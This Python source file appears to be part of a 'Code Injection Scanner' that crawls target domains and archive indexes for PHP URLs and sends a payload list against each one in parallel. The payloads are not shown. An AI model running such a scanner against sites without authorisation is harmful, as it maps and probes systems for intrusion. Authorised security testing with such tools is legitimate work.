# Function to clean URL (remove Wayback Machine prefix if any)
def clean_url(url):
    if "web.archive.org" in url:
        original_url_start = url.find("http", 20)
        if original_url_start != -1:
            url = url[original_url_start:]
    return url

# Function to crawl and extract URLs internally
def crawl_internal_links(start_url, domain, max_depth=3):
    visited = set()
    to_visit = [(start_url, 0)]
    php_urls = set()

    while to_visit:
        current_url, depth = to_visit.pop(0)

        if current_url in visited or depth > max_depth:
            continue

        visited.add(current_url)
        log_with_color("debug", f"Crawling: {current_url} at depth {depth}", "blue")

        soup = fetch_and_parse_url(current_url)
        if soup:
            # Find all links
            for link in soup.find_all('a', href=True):
                href = link.get('href')
                href = urljoin(current_url, href)
                href_parsed = urlparse(href)

                # Only process http and https URLs
                if href_parsed.scheme not in ['http', 'https']:
                    continue

                href_clean = href_parsed._replace(fragment='').geturl()

                # Ensure the URL is within the target domain
                if not href_clean.startswith(domain):
                    continue

                # Check if the URL contains PHP-related extensions
                if re.search(r'\.(php|aps|apsx|html|php3|php4|php5|php7|php8|phtml)$', href_clean, re.I):
                    php_urls.add(href_clean)

                if href_clean not in visited:
                    to_visit.append((href_clean, depth + 1))

    return php_urls

# Function to crawl and extract URLs
def crawl_and_extract(start_url, use_wayback, use_commoncrawl, cursor, conn, max_depth=3):
    parsed_start = urlparse(start_url)
    domain = f"{parsed_start.scheme}://{parsed_start.netloc}"

    # Internal Crawling
    internal_php_urls = crawl_internal_links(start_url, domain, max_depth=max_depth)
    log_with_color("info", f"Extracted {len(internal_php_urls)} internal .php URLs from crawling.", "cyan")

    # Insert internal PHP URLs into database
    for url in internal_php_urls:
        try:
            cursor.execute("INSERT OR IGNORE INTO urls (url) VALUES (?)", (url,))
        except sqlite3.IntegrityError:
            continue
    conn.commit()

    # Extract URLs from Wayback Machine if enabled
    wayback_urls = []
    if use_wayback:
        try:
            from waybackpy import WaybackMachineCDXServerAPI
            wayback = WaybackMachineCDXServerAPI(domain)
            for snapshot in wayback.snapshots():
                try:
                    original_url = snapshot.original
                    original_url = clean_url(original_url)
                    if original_url.startswith(domain):
                        wayback_urls.append(original_url)
                except AttributeError:
                    continue
            log_with_color("info", f"Extracted {len(wayback_urls)} URLs from Wayback Machine for {domain}.", "cyan")
        except ImportError:
            log_with_color("error", "waybackpy library not installed. Install it using 'pip install waybackpy'.", "red")

    # Extract URLs from CommonCrawl if enabled
    commoncrawl_urls = []
    if use_commoncrawl:
        try:
            index_url = f"https://index.commoncrawl.org/CC-MAIN-2024-30-index?url={parsed_start.netloc}/*&output=json"
            response = requests.get(index_url, timeout=10, verify=False)
            if response.status_code == 200:
                for line in response.iter_lines():
                    if line:
                        try:
                            data = json.loads(line)
                            external_url = data['url']
                            external_url = clean_url(external_url)
                            if external_url.startswith(domain):
                                commoncrawl_urls.append(external_url)
                        except json.JSONDecodeError:
                            continue
                log_with_color("info", f"Extracted {len(commoncrawl_urls)} URLs from CommonCrawl for {domain}.", "cyan")
            else:
                log_with_color("error", f"Error fetching CommonCrawl data: {response.status_code}", "red")
        except Exception as e:
            log_with_color("error", f"Exception during CommonCrawl URL extraction: {e}", "red")

    # Combine and clean URLs from Wayback and CommonCrawl
    all_external_urls = set(commoncrawl_urls + wayback_urls)
    cleaned_external_urls = set()
    for url in all_external_urls:
        clean = clean_url(url)
        if ".php" in clean and clean.startswith(domain):
            cleaned_external_urls.add(clean)

    # Insert external PHP URLs into database
    for url in cleaned_external_urls:
        try:
            cursor.execute("INSERT OR IGNORE INTO urls (url) VALUES (?)", (url,))
        except sqlite3.IntegrityError:
            continue
    conn.commit()
    log_with_color("info", f"Saved {len(cleaned_external_urls)} external .php URLs to the database.", "cyan")

    # Total URLs added
    total_php_urls = len(internal_php_urls) + len(cleaned_external_urls)
    log_with_color("info", f"Total .php URLs saved to the database: {total_php_urls}", "cyan")

# AI-based vulnerability detection (Optional)
def ai_based_detection(db_name, model_path='vuln_model.pkl'):
    if not os.path.exists(model_path):
        log_with_color("error", f"AI model file '{model_path}' not found. Please train the model first.", "red")
        return None
    model = joblib.load(model_path)
    log_with_color("info", "AI model loaded successfully.", "green")
    return model

BANNER = """
Code Injection Scanner
AI and ML Powered
Version 1.0a
haroon@cyberzeus.pk
https://cyberzeus.pk
"""

def main():
    print(BANNER)  # Display the professional banner
    parser = argparse.ArgumentParser(
        description="Code Injection Scanner",
        usage="python phpscan.py --start-url <URL> [OPTIONS]"
    )

    # Group for mandatory input options
    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument(
        '--start-url', 
        type=str, 
        help='Specify the starting URL for crawling and analysis.'
    )
    input_group.add_argument(
        '-d', '--domains-file', 
        type=str, 
        help='Provide a file containing a list of domains for batch testing.'
    )

    # Additional options
    parser.add_argument(
        '--train-model', 
        action='store_true', 
        help='Train the AI model using the data stored in the existing database.'
    )
    parser.add_argument(
        '-db', '--database', 
        default='codeinjection-scan-ml.db', 
        help='Specify the SQLite database file name (default: codeinjection-scan-ml.db).'
    )
    parser.add_argument(
        '-r', '--report', 
        action='store_true', 
        help='Generate detailed HTML vulnerability reports.'
    )
    parser.add_argument(
        '-v', '--verbose', 
        action='store_true', 
        help='Enable verbose output for detailed runtime logs.'
    )
    parser.add_argument(
        '-m', '--model', 
        type=str, 
        default='vuln_model.pkl', 
        help='Path to the AI model file for vulnerability detection (default: vuln_model.pkl).'
    )
    parser.add_argument(
        '--use-ai', 
        action='store_true', 
        help='Leverage AI-based algorithms for advanced vulnerability detection.'
    )
    parser.add_argument(
        '--include-wayback', 
        action='store_true', 
        help='Include URLs from the Wayback Machine for extensive crawling.'
    )
    parser.add_argument(
        '--use-commoncrawl', 
        action='store_true', 
        help='Include CommonCrawl data in the crawling process.'
    )
    parser.add_argument(
        '--max-depth', 
        type=int, 
        default=3, 
        help='Set the maximum depth for internal crawling (default: 3).'
    )

    # New group for saving responses without mutual exclusivity
    save_group = parser.add_argument_group('Saving Options')
    save_group.add_argument(
        '--save200only', 
        action='store_true', 
        help='Save only responses with HTTP 200 OK status.'
    )
    save_group.add_argument(
        '--saveallresponses', 
        action='store_true', 
        help='Save all responses regardless of HTTP status.'
    )
    save_group.add_argument(
        '--save-status', 
        type=int, 
        nargs='+', 
        metavar='STATUS', 
        help='Specify HTTP status codes to save responses (e.g., --save-status 200 404).'
    )

    # Add filterresponse as an independent option
    parser.add_argument(
        '--filterresponse',
        action='store_true',
        help='Filters out empty responses or those starting with <!DOCTYPE or <html> to reduce false positives.'
    )

    # Parse arguments
    args = parser.parse_args()

    # Display parsed options (for example purposes, replace with actual functionality)
    print("\n[INFO] Parsed Arguments:")
    for arg, value in vars(args).items():
        print(f"{arg}: {value}")

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        console_handler.setLevel(logging.DEBUG)

    conn, cursor = setup_database(args.database)

    if args.train_model:
        train_model(args.database, args.model)
        conn.close()
        return

    # Load AI model if AI detection is enabled
    model = None
    if args.use_ai:
        model = ai_based_detection(args.database, args.model)
        if not model:
            log_with_color("error", "AI detection is enabled but the model could not be loaded. Exiting.", "red")
            conn.close()
            return

    # Determine save options based on command-line arguments
    save_options = {
        'save200_only': False,
        'save_all': False,
        'custom_statuses': set(),
        'filter_response': False  # New key for filtering responses
    }

    if args.save200only:
        save_options['save200_only'] = True
    if args.saveallresponses:
        save_options['save_all'] = True
    if args.save_status:
        save_options['custom_statuses'] = set(args.save_status)
    if args.filterresponse:
        save_options['filter_response'] = True

    # If --filterresponse is used without any save option, warn the user
    if args.filterresponse and not (args.save200only or args.saveallresponses or args.save_status):
        log_with_color("error", "--filterresponse must be used with a save option (e.g., --saveallresponses, --save200only, --save-status).", "red")
        conn.close()
        return

    if not (args.save200only or args.saveallresponses or args.save_status):
        # Default behavior: Save only 200 OK responses
        save_options['save200_only'] = True
        log_with_color("info", "No save option specified. Defaulting to --save200only.", "yellow")

    domains = []
    if args.start_url:
        domains.append(args.start_url)
    if args.domains_file:
        domains.extend(load_domains_from_file(args.domains_file))

    for domain in domains:
        log_with_color("info", f"Starting URL extraction for domain: {domain}", "blue")
        crawl_and_extract(domain, args.include_wayback, args.use_commoncrawl, cursor, conn, max_depth=args.max_depth)

    # Fetch all URLs from the database
    cursor.execute("SELECT url FROM urls")
    urls = cursor.fetchall()
    log_with_color("info", f"Total URLs to test: {len(urls)}", "cyan")

    if not urls:
        log_with_color("error", "No URLs to test. Exiting.", "red")
        conn.close()
        return

    # Prepare tasks for multiprocessing
    tasks = []
    for url_tuple in urls:
        url = url_tuple[0]
        tasks.append((url, payloads, model, args.database, save_options))

    # Define number of workers
    pool_size = min(cpu_count(), 24)  # Limiting to 24 to prevent excessive resource usage
    log_with_color("info", f"Using multiprocessing with {pool_size} workers.", "cyan")

    # Use multiprocessing Pool to handle tasks
    with Pool(pool_size) as pool:
        pool.map(worker, tasks)

    # Generate HTML report if requested
    if args.report:
        cursor.execute("SELECT * FROM vulnerabilities")
        generate_html_report(cursor, "found_vulnerability_codeinjection-scan-ml.html", vulnerabilities_only=True)

    conn.close()
    log_with_color("info", "Completed all tasks.", "green")

if __name__ == "__main__":
    main()
